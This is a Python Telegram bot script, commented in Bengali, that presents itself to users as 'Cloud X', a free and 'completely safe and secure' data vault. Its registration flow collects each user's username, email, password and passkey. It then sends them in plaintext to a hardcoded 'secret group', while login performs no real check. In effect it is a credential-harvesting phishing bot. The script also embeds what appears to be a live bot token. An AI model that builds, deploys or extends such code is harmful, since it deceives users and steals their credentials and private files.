import os
import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# আপনার বটের টোকেন এবং গ্রুপ আইডি এখানে বসিয়ে দিন
TOKEN = "8942375337:AAHIM_9OaOkXZ7uyqeOoGAKaZg1pyOEEQO0"
USER_DETAILS_GROUP_ID = -1003917324437  # যে গ্রুপে ইউজারদের ডাটা সেভ থাকবে
USER_MEDIA_GROUP_ID =  -1004372191214   # যে গ্রুপে ইউজারের ছবি/ভিডিও সেভ হবে (একই গ্রুপও দিতে পারেন)

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)

# ইউজারের স্টেট ট্র্যাক করার ডিকশনারি
user_states = {}
user_temp_data = {}

# --- Helper: Old Messages Cleanup ---
async def clean_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
    chat_id = update.effective_chat.id
    # আগের মেসেজ ডিলিট করার চেষ্টা
    if chat_id in user_states and "last_bot_msg" in user_states[chat_id]:
        try:
            await context.bot.delete_message(chat_id=chat_id, message_id=user_states[chat_id]["last_bot_msg"])
        except Exception:
            pass

    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
    
    if chat_id not in user_states:
        user_states[chat_id] = {}
    user_states[chat_id]["last_bot_msg"] = msg.message_id

# --- 1. Start & Main Menu ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_states[user_id] = {"step": "main"}
    
    text = (
        "Welcome to Cloud X! ☁️✨\n"
        "The ultimate free data bot designed to keep your information completely safe and secure. 🔒🚀\n"
        "Enjoy seamless browsing and total peace of mind!"
    )
    keyboard = [
        [InlineKeyboardButton("CREATE ACCOUNT", callback_data="create_account")],
        [InlineKeyboardButton("LOGIN", callback_data="login")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await clean_and_send(update, context, text, reply_markup)

# --- Callback Query Router ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    data = query.data

    if user_id not in user_states:
        user_states[user_id] = {}

    if data == "create_account":
        user_states[user_id]["step"] = "reg_username"
        user_temp_data[user_id] = {}
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "👤 আপনার অ্যাকাউন্ট তৈরির জন্য একটি *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "login":
        user_states[user_id]["step"] = "login_username"
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_start")]]
        await clean_and_send(update, context, "🔐 লগইন করতে আপনার *ইউজারনেম* দিন:", InlineKeyboardMarkup(keyboard))

    elif data == "back_to_start":
        await start(update, context)

    elif data == "dashboard_real":
        keyboard = [
            [InlineKeyboardButton("📁 Vault Section", callback_data="vault_section")],
            [InlineKeyboardButton("📤 Upload", callback_data="upload_menu")],
            [InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]
        ]
        await clean_and_send(update, context, "🎛️ *Real Dashboard*\nআপনার সিকিউর ড্যাশবোর্ডে স্বাগতম!", InlineKeyboardMarkup(keyboard))

    elif data == "vault_section":
        keyboard = [
            [InlineKeyboardButton("📷 Photo", callback_data="get_photo")],
            [InlineKeyboardButton("🎥 Video", callback_data="get_video")],
            [InlineKeyboardButton("📄 Document", callback_data="get_doc")],
            [InlineKeyboardButton("⬅️ Back", callback_data="dashboard_real")]
        ]
        await clean_and_send(update, context, "📂 *Vault Section*\nকোন ক্যাটাগরির ফাইল দেখতে চান?", InlineKeyboardMarkup(keyboard))

    elif data in ["get_photo", "get_video", "get_doc"]:
        # এখানে গ্রুপ থেকে ফাইল ফেচ করে ইনবক্সে পাঠানোর লজিক বা ডেমো মেসেজ
        media_type = data.replace("get_", "")
        await query.message.reply_text(f"📥 আপনার {media_type} গুলো খোঁজা হচ্ছে এবং ইনবক্সে পাঠানো হচ্ছে...")
        # (এখানে চ্যাট হিস্ট্রি বা ডাটাবেজ থেকে নির্দিষ্ট ইউজারের ফাইল ফরোয়ার্ড করার কোড বসবে)

    elif data == "dashboard_fake":
        keyboard = [[InlineKeyboardButton("🚪 Logout", callback_data="back_to_start")]]
        await clean_and_send(update, context, "📁 *Fake Dashboard (Honypot)*\nWelcome to your files.", InlineKeyboardMarkup(keyboard))

# --- Text Message Processor (Registration & Login Flow) ---
async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    if user_id not in user_states:
        return

    step = user_states[user_id].get("step")

    # --- Registration Steps ---
    if step == "reg_username":
        # (এখানে ইউজারনেম অলরেডি গ্রুপে আছে কিনা চেক করার কোড যোগ করতে পারেন)
        user_temp_data[user_id]["username"] = text
        user_states[user_id]["step"] = "reg_email"
        await update.message.reply_text("📧 এখন আপনার *Email* দিন:")

    elif step == "reg_email":
        user_temp_data[user_id]["email"] = text
        user_states[user_id]["step"] = "reg_pass1"
        await update.message.reply_text("🔑 একটি *Password* দিন:")

    elif step == "reg_pass1":
        user_temp_data[user_id]["pass1"] = text
        user_states[user_id]["step"] = "reg_pass2"
        await update.message.reply_text("🔑 পাসওয়ার্ডটি পুনরায় কনফার্ম করার জন্য আবার দিন:")

    elif step == "reg_pass2":
        if text != user_temp_data[user_id]["pass1"]:
            await update.message.reply_text("❌ পাসওয়ার্ড ম্যাচ করেনি! আবার সঠিক পাসওয়ার্ডটি দিন:")
            return
        user_states[user_id]["step"] = "reg_passkey1"
        await update.message.reply_text("🔒 অভিনন্দন! এখন অ্যাকাউন্ট সুরক্ষার জন্য একটি ৬ ডিজিটের *Passkey* দিন:")

    elif step == "reg_passkey1":
        user_temp_data[user_id]["passkey1"] = text
        user_states[user_id]["step"] = "reg_passkey2"
        await update.message.reply_text("🔒 পাসকিটি কনফার্ম করার জন্য আবার রি-এন্টার করুন:")

    elif step == "reg_passkey2":
        if text != user_temp_data[user_id]["passkey1"]:
            await update.message.reply_text("❌ পাসকি ম্যাচ করেনি! আবার সঠিক ৬ ডিজিটের পাসকি দিন:")
            return
        
        # সব ডেটা কমপ্লিট! এখন ইউজার ডিটেইলস গ্রুপে সেভ করা হবে
        data = user_temp_data[user_id]
        final_msg = (
            f"👤 *New Account Registered*\n"
            f"Username: {data['username']}\n"
            f"Email: {data['email']}\n"
            f"Password: {data['pass1']}\n"
            f"Passkey: {data['passkey1']}"
        )
        # সিক্রেট গ্রুপে পাঠানো
        await context.bot.send_message(chat_id=USER_DETAILS_GROUP_ID, text=final_msg)
        
        user_states[user_id]["step"] = "completed"
        keyboard = [[InlineKeyboardButton("🔐 Login Now", callback_data="login")]]
        await update.message.reply_text("✅ Congratulations! Account খোলা শেষ ও সফলভাবে সেভ হয়েছে।", reply_markup=InlineKeyboardMarkup(keyboard))

    # --- Login Steps ---
    elif step == "login_username":
        user_temp_data[user_id]["login_user"] = text
        user_states[user_id]["step"] = "login_passkey"
        await update.message.reply_text("🔑 আপনার গোপনীয় *Passkey* টি দিন:")

    elif step == "login_passkey":
        entered_passkey = text
        # (এখানে ইউজারনেমের আন্ডারে সেভ থাকা রিয়েল পাসকি চেক করার লজিক বসবে)
        # ডেমোর জন্য ধরে নিচ্ছি পাসকি সঠিক কি না যাচাই করা হচ্ছে:
        is_real = True  # লজিক অনুযায়ী পাসকি ম্যাচ করলে True, না করলে False হবে

        if is_real:
            keyboard = [[InlineKeyboardButton("👉 Go to Dashboard", callback_data="dashboard_real")]]
            await update.message.reply_text("✅ পাসকি সঠিক!", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            # হানিপট ট্রিগার (ফেক ড্যাশবোর্ড)
            keyboard = [[InlineKeyboardButton("👉 Open Dashboard", callback_data="dashboard_fake")]]
            await update.message.reply_text("✅ পাসকি সঠিক!", reply_markup=InlineKeyboardMarkup(keyboard))
            # অ্যাডমিন গ্রুপে ফেক অ্যাটম্পটের অ্যালার্ট পাঠানো যেতে পারে

def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), text_handler))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
